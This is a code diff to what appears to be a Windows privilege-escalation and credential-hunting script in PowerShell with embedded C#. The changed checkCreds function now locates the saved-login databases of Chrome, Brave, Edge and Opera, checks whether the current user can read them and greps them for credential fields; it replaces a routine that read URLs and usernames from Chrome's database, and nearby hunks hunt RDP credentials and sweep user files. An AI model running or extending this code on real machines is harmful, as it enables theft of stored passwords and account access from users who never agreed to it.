@@ -79,7 +79,6 @@ using System.Security.Principal;
 using System.Collections;
 using System.Text;
 using System.Diagnostics;
-using System.Linq;
 
 public class DriverLoader
 {
@@ -1814,30 +1813,30 @@ function checkCreds {
         Write-Output "[-] Error while listing Windows Credential Manager"
     }
 
-    try {
-        # Chrome Stored Credentials
-        $chromeDB = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
-        if (Test-Path $chromeDB) {
-            Add-Type -AssemblyName "System.Data.SQLite"
-            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$chromeDB;Version=3;")
-            $conn.Open()
-
-            $query = "SELECT origin_url, username_value FROM logins"
-            $cmd = $conn.CreateCommand()
-            $cmd.CommandText = $query
-            $reader = $cmd.ExecuteReader()
-
-            while ($reader.Read()) {
-                $url = $reader["origin_url"]
-                $username = $reader["username_value"]
-                Write-Output "URL: $url, Username: $username"
+    # Paths for browsers' credential databases
+    $databases = @(
+        "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data",
+        "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
+        "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Login Data",
+        "$env:USERPROFILE\AppData\Roaming\Opera Software\Opera Stable\Login Data"
+    )
+    foreach ($dbPath in $databases) {
+        try {
+            if ((Test-Path $dbPath) -and ((Get-Acl $dbPath).Access.IdentityReference -match "$env:USERDOMAIN\\$env:USERNAME")) {
+                $content = Get-Content -Path $dbPath -ErrorAction Stop
+                foreach ($line in $content) {
+                    if ($line -match "origin_url|username_value") {
+                        Write-Output "[+] Grep Browser creds match, file is accessible! $dbPath"
+                    }
+                }
             }
-            $conn.Close()
         }
+        catch {
+            Write-Output "[-] Error while looking for Stored Credentials: $_"
+        }
+
     }
-    catch {
-        Write-Output "[-] Error while looking for Chrome Stored Creds"
-    }
+    
     try {
         # RDP Cred
         Write-Output "[$([char]0xD83D + [char]0xDC80)] Looking for RDP creds"
@@ -1864,7 +1863,7 @@ function checkCreds {
         $dirsToSearch = @("$env:USERPROFILE", "$env:ProgramData", "$env:ProgramFiles", "$env:ProgramFiles(x86)", "$env:OneDrive", "$env:Path")
 
         foreach ($dir in $dirsToSearch) {
-            $files = Get-ChildItem -Path $dir -Recurse -Include *.txt, *.docx, *.ini, *.md | Where-Object { $_.FullName -notmatch 'pyenv|python|pycom|pymakr|wordlist|seclist|node_modules|extensions|miniconda' } | Where-Object {(get-acl $_.fullname).access.IdentityReference -Match "$env:USERDOMAIN\\$env:USERNAME"}   
+            $files = Get-ChildItem -Path $dir -Recurse -Include *.txt, *.docx, *.ini, *.md | Where-Object { $_.FullName -notmatch 'pyenv|python|pycom|pymakr|wordlist|seclist|node_modules|extensions|miniconda|PowerShell_transcript' } | Where-Object {(get-acl $_.fullname).access.IdentityReference -Match "$env:USERDOMAIN\\$env:USERNAME"}   
         
             # Iterate over each file
             foreach ($file in $files) {
